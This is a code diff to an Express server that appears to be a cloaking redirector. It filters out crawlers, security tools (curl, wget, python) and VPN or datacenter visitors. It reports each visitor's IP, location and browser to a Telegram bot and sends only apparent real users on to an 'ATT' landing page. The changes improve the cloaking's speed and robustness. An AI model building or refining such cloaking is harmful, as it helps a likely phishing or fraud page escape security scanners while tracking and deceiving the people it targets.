@@ -1,4 +1,5 @@
 const express = require('express');
+require('dotenv').config();
 const axios = require('axios');
 const path = require('path');
 const cors = require('cors');
@@ -19,19 +20,39 @@ const VISITED_IPS_FILE = path.join(__dirname, 'visited_ips.json');
 const FORCED_IPS_FILE = path.join(__dirname, 'forced_ips.json');
 const SETTINGS_FILE = path.join(__dirname, 'settings.json');
 
-// Ensure the files exist
-if (!fssync.existsSync(VISITED_IPS_FILE)) {
-    fssync.writeFileSync(VISITED_IPS_FILE, JSON.stringify([]));
+// Cache for file-based data
+let cache = {
+    visitedIps: null,
+    forcedIps: null,
+    settings: null
+};
+
+// Ensure the files exist and load cache
+async function initCache() {
+    try {
+        if (!fssync.existsSync(VISITED_IPS_FILE)) {
+            fssync.writeFileSync(VISITED_IPS_FILE, JSON.stringify([]));
+        }
+        if (!fssync.existsSync(FORCED_IPS_FILE)) {
+            fssync.writeFileSync(FORCED_IPS_FILE, JSON.stringify([]));
+        }
+        if (!fssync.existsSync(SETTINGS_FILE)) {
+            fssync.writeFileSync(SETTINGS_FILE, JSON.stringify({ 
+                isSuspiciousEnabled: true,
+                isIspFilterEnabled: true 
+            }));
+        }
+
+        cache.visitedIps = JSON.parse(await fs.readFile(VISITED_IPS_FILE, 'utf8'));
+        cache.forcedIps = JSON.parse(await fs.readFile(FORCED_IPS_FILE, 'utf8'));
+        cache.settings = JSON.parse(await fs.readFile(SETTINGS_FILE, 'utf8'));
+        console.log('Cache initialized successfully');
+    } catch (err) {
+        console.error('Failed to initialize cache:', err);
+        process.exit(1);
+    }
 }
-if (!fssync.existsSync(FORCED_IPS_FILE)) {
-    fssync.writeFileSync(FORCED_IPS_FILE, JSON.stringify([]));
-}
-if (!fssync.existsSync(SETTINGS_FILE)) {
-    fssync.writeFileSync(SETTINGS_FILE, JSON.stringify({ 
-        isSuspiciousEnabled: true,
-        isIspFilterEnabled: true 
-    }));
-}
+initCache();
 
 // Mutex-like lock for file operations
 let fileLock = false;
@@ -48,18 +69,15 @@ async function withLock(fn) {
 }
 
 async function getVisitedIps() {
-    try {
-        const data = await fs.readFile(VISITED_IPS_FILE, 'utf8');
-        let ips = JSON.parse(data);
+    if (cache.visitedIps) {
         const now = Date.now();
         const twentyFourHours = 24 * 60 * 60 * 1000;
-        return ips.filter(entry => {
+        return cache.visitedIps.filter(entry => {
             const timestamp = typeof entry === 'object' ? entry.timestamp : 0;
             return (now - timestamp) < twentyFourHours;
         });
-    } catch (e) {
-        return [];
     }
+    return [];
 }
 
 async function addVisitedIp(ip) {
@@ -69,9 +87,11 @@ async function addVisitedIp(ip) {
         
         if (existingIndex === -1) {
             ips.push({ ip, timestamp: Date.now() });
+            cache.visitedIps = ips;
             await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(ips, null, 2));
         } else if (typeof ips[existingIndex] !== 'object') {
             ips[existingIndex] = { ip, timestamp: Date.now() };
+            cache.visitedIps = ips;
             await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(ips, null, 2));
         }
     });
@@ -81,23 +101,20 @@ async function removeVisitedIp(ip) {
     await withLock(async () => {
         const ips = await getVisitedIps();
         const newIps = ips.filter(entry => (typeof entry === 'object' ? entry.ip : entry) !== ip);
+        cache.visitedIps = newIps;
         await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(newIps, null, 2));
     });
 }
 
 async function clearVisitedIps() {
     await withLock(async () => {
+        cache.visitedIps = [];
         await fs.writeFile(VISITED_IPS_FILE, JSON.stringify([], null, 2));
     });
 }
 
 async function getForcedIps() {
-    try {
-        const data = await fs.readFile(FORCED_IPS_FILE, 'utf8');
-        return JSON.parse(data);
-    } catch (e) {
-        return [];
-    }
+    return cache.forcedIps || [];
 }
 
 async function addForcedIp(ip) {
@@ -105,6 +122,7 @@ async function addForcedIp(ip) {
         const ips = await getForcedIps();
         if (!ips.includes(ip)) {
             ips.push(ip);
+            cache.forcedIps = ips;
             await fs.writeFile(FORCED_IPS_FILE, JSON.stringify(ips, null, 2));
         }
     });
@@ -114,28 +132,24 @@ async function removeForcedIp(ip) {
     await withLock(async () => {
         const ips = await getForcedIps();
         const newIps = ips.filter(i => i !== ip);
+        cache.forcedIps = newIps;
         await fs.writeFile(FORCED_IPS_FILE, JSON.stringify(newIps, null, 2));
     });
 }
 
 async function getSettings() {
-    try {
-        const data = await fs.readFile(SETTINGS_FILE, 'utf8');
-        const settings = JSON.parse(data);
-        return {
-            isSuspiciousEnabled: true,
-            isIspFilterEnabled: true,
-            ...settings
-        };
-    } catch (e) {
-        return { isSuspiciousEnabled: true, isIspFilterEnabled: true };
-    }
+    return {
+        isSuspiciousEnabled: true,
+        isIspFilterEnabled: true,
+        ...(cache.settings || {})
+    };
 }
 
 async function updateSettings(newSettings) {
     return await withLock(async () => {
         const settings = await getSettings();
         const updated = { ...settings, ...newSettings };
+        cache.settings = updated;
         await fs.writeFile(SETTINGS_FILE, JSON.stringify(updated, null, 2));
         return updated;
     });
@@ -165,13 +179,27 @@ if (!ADMIN_TOKEN || !TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !ATT_LANDING_PAG
 
 const BOT_USER_AGENTS = [
     'googlebot', 'bingbot', 'yandexbot', 'duckduckbot', 'slurp', 'baiduspider', 'facebot', 'ia_archiver',
-    'crawler', 'spider', 'robot', 'curl', 'wget', 'python', 'postman', 'insomnia', 'headless'
+    'crawler', 'spider', 'robot', 'curl', 'wget', 'python', 'postman', 'insomnia', 'headless',
+    'screaming frog', 'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot', 'rogerbot', 'exabot', 'petalbot'
 ];
+const BOT_UA_REGEX = new RegExp(BOT_USER_AGENTS.join('|'), 'i');
 
 // Security: Use Helmet for security headers
 app.use(helmet({
-    contentSecurityPolicy: false, // Set to false if you have complex external scripts
+    contentSecurityPolicy: {
+        directives: {
+            defaultSrc: ["'self'"],
+            scriptSrc: ["'self'", "'unsafe-inline'"],
+            styleSrc: ["'self'", "'unsafe-inline'"],
+            imgSrc: ["'self'", "data:"],
+            connectSrc: ["'self'", "https://api.telegram.org", "http://ip-api.com"]
+        }
+    },
+    referrerPolicy: { policy: 'no-referrer' }
 }));
+
+// Disable X-Powered-By for security
+app.disable('x-powered-by');
 
 // Crawler Protection: Set X-Robots-Tag to prevent indexing
 app.use((req, res, next) => {
@@ -189,6 +217,13 @@ const limiter = rateLimit({
 });
 app.use(limiter);
 
+// Restricted CORS
+app.use(cors({
+    origin: '*', // Wildcard for dynamic subdomains if needed, but methods are restricted
+    methods: ['GET', 'POST'],
+    allowedHeaders: ['Content-Type', 'x-admin-token']
+}));
+
 app.use(express.json());
 
 // Serve only the index.html file
@@ -204,9 +239,8 @@ app.get('/robots.txt', (req, res) => {
 
 // Helper to check for bots
 function isBot(req) {
-    const ua = (req.headers['user-agent'] || '').toLowerCase();
-    if (!ua) return true;
-    return BOT_USER_AGENTS.some(bot => ua.includes(bot));
+    const ua = req.headers['user-agent'] || '';
+    return !ua || BOT_UA_REGEX.test(ua);
 }
 
 // Admin Authentication Middleware
@@ -242,14 +276,13 @@ app.get('/init', async (req, res) => {
 
     if (isForced) {
         console.log(`[Init] IP ${clientIp} is forced. Redirecting to ATT page.`);
-        // Send simplified notification for forced visit (optional, but keep it consistent)
-        try {
-            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                chat_id: TELEGRAM_CHAT_ID,
-                text: `✨ *FORCED REDIRECT VISIT* \n\n📍 *IP:* ${clientIp}\n💻 *Browser:* ${userAgent}\n🕒 *Time:* ${new Date().toLocaleString()}`,
-                parse_mode: 'Markdown'
-            });
-        } catch (e) {}
+        // Send simplified notification for forced visit (Asynchronous)
+        axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: `✨ *FORCED REDIRECT VISIT* \n\n📍 *IP:* ${clientIp}\n💻 *Browser:* ${userAgent}\n🕒 *Time:* ${new Date().toLocaleString()}`,
+            parse_mode: 'Markdown'
+        }, { timeout: 4000 }).catch(e => console.error('[Init] Forced notification failed:', e.message));
+        
         return res.json({ redirect: '/go-att' });
     }
 
@@ -264,7 +297,7 @@ app.get('/init', async (req, res) => {
     // 2. FETCH EXTERNAL DATA (Slowest part)
     let data = null;
     try {
-        const response = await axios.get(`http://ip-api.com/json/${clientIp}?fields=status,message,country,regionName,city,isp,org,as,proxy,hosting,query`);
+        const response = await axios.get(`http://ip-api.com/json/${clientIp}?fields=status,message,country,regionName,city,isp,org,as,proxy,hosting,query`, { timeout: 5000 });
         data = response.data;
         console.log(`[Init] ISP Lookup:`, data);
     } catch (error) {
@@ -277,7 +310,7 @@ app.get('/init', async (req, res) => {
     const isSuspicious = isProxy || isHosting;
     const settings = await getSettings();
 
-    // Send Telegram Notification
+    // Send Telegram Notification (Asynchronous for speed)
     let message = `🚀 *New App Visit!* \n\n`;
     if (isProxy) message += `🚫 *VPN/PROXY DETECTED*\n\n`;
     else if (isHosting) message += `☁️ *DATACENTER/HOSTING DETECTED*\n\n`;
@@ -294,13 +327,12 @@ app.get('/init', async (req, res) => {
     if (isSuspicious) message += `🛡️ *Flags:* ${isProxy ? 'Proxy/VPN ' : ''}${isHosting ? 'DataCenter' : ''}\n`;
     message += `🕒 *Time:* ${new Date().toLocaleString()}`;
 
-    try {
-        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        });
-    } catch (e) {}
+    // Send notification without awaiting to speed up response
+    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+    }, { timeout: 4000 }).catch(e => console.error('[Init] Telegram notification failed:', e.message));
 
     // 4. FINAL REDIRECT LOGIC
     let targetUrl = NON_ATT_LANDING_PAGE;
@@ -608,7 +640,7 @@ app.post('/api/telegram', async (req, res) => {
             chat_id: TELEGRAM_CHAT_ID,
             text: message,
             parse_mode: 'Markdown'
-        });
+        }, { timeout: 5000 });
         res.status(200).send('Message sent successfully');
     } catch (error) {
         console.error('Error sending message:', error.response?.data || error.message);
